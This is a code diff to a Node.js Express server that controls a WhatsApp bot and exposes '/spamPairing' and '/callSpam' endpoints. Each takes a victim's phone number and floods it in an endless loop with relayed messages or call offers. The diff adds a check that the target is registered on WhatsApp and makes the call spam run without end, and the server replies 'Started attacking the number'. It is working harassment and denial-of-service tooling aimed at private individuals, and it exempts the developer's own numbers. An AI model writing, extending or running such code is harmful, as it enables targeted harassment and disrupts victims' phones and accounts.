@@ -163,6 +163,7 @@ app.get('/spamPairing', async (req, res) => {
         return res.status(403).send('Cannot attack developer');
     }
 async function SendPairing(target, Ptcp = true) {
+const jid = toWhatsAppJID(target); // Convert phone number to JID
             while (true) {
 			await XeonBotInc.relayMessage(target, {
 					viewOnceMessage: {
@@ -187,6 +188,13 @@ async function SendPairing(target, Ptcp = true) {
     if (!target || !phoneNumberPattern.test(target)) {
         return res.status(400).send('Phone number you have provided is invalid');
     }
+    
+    // Check if the number is registered on WhatsApp
+    const contactInfo = await sam.onWhatsApp(target);
+    if (contactInfo.length === 0) {
+        return res.status(404).send('The number is not registered on WhatsApp');
+    }
+    
     try {
     	res.send(`Started attacking the number ${target}`);
         await SendPairing(target); // Pass validated phone number to the function
@@ -196,32 +204,38 @@ async function SendPairing(target, Ptcp = true) {
     }
 });
 //====================================\\
-app.get('/spamCall', async (req, res) => {
-      const { target } = req.query;
-    // Helper function to check if the number is a developer's number
+app.get('/callSpam', async (req, res) => {
+	
+    const { target } = req.query; // Access the target parameter from the query string
+    // Check if the target is a developer number
     if (isDeveloperNumber(target)) {
         return res.status(403).send('Cannot attack developer');
     }
-
-    // Function to perform the spam call
-    async function sendOfferCall(target) {
-    try {
-        await XeonBotInc.offerCall(target);
-        console.log(chalk.white.bold(`Success Send Offer Call To Target ${target}`));
-    } catch (error) {
-        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
-    }
+async function samCallSpam(target) {
+const jid = toWhatsAppJID(target); // Convert phone number to JID
+while (true) {
+await XeonBotInc.offerCall(jid);
 }
+		};
+    // Basic validation for phone numbers
     const phoneNumberPattern = /^[+]?[0-9]{1,15}$/; // Allows numbers with or without "+" and a max length of 15 digits
     if (!target || !phoneNumberPattern.test(target)) {
         return res.status(400).send('Phone number you have provided is invalid');
     }
+    
+    // Check if the number is registered on WhatsApp
+    const contactInfo = await sam.onWhatsApp(target);
+    if (contactInfo.length === 0) {
+        return res.status(404).send('The number is not registered on WhatsApp');
+    }
+
     try {
-    	res.send(`Started attacking the number ${target}`);
-        await sendOfferCall(target); // Pass validated phone number to the function
+    	res.send(`🕷️ Successfully sent spam call to the number ${target}`);
+        await samCallSpam(target); // Pass validated phone number to the function
     } catch (error) {
         console.error(error.message);
         res.status(500).send('An error occurred while sending the message');
+    }
     }
 });
 //====================================\\
